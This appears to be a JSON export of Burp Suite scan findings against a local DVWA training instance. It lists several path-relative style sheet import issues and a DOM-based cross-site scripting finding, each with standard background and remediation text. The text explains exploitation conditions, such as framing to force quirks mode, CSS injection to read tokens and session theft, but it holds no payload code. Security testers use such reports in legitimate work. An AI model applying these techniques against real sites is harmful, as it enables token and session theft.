        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "90": {
        "\ufeffissue__serialNumber": "4.70314E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/setup.php",
        "issue__location": "/dvwa/setup.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "91": {
        "\ufeffissue__serialNumber": "1.77789E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "92": {
        "\ufeffissue__serialNumber": "3.09471E+17",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/exec/",
        "issue__location": "/dvwa/vulnerabilities/exec/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "93": {
        "\ufeffissue__serialNumber": "4.25326E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "94": {
        "\ufeffissue__serialNumber": "8.70465E+18",
        "issue__type": "2097936",
        "issue__name": "Cross-site scripting (DOM-based)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_d/",
        "issue__location": "/dvwa/vulnerabilities/xss_d/",
        "issue__severity": "High",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>DOM-based vulnerabilities arise when a client-side script reads data from a controllable part of the DOM (for example, the URL) and processes this data in an unsafe way.</p>\\n<p>DOM-based cross-site scripting arises when a script  writes controllable data into the HTML document in an unsafe way. An attacker may be able to use the vulnerability to construct a URL that, if visited by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to visit the attacker's crafted URL in various ways, similar to the usual attack delivery vectors for reflected cross-site scripting vulnerabilities.</p>\\n\\n<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>",
        "issue__remediationBackground": "<p>The most effective way to avoid DOM-based cross-site scripting vulnerabilities is not to dynamically write data from any untrusted source into the HTML document. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing script code into the document. In many cases, the relevant data can be validated on a whitelist basis, to allow only content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context that the data is to be inserted may need to involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based\">Web Security Academy: DOM-based cross-site scripting</a></li>\\n</ul>",
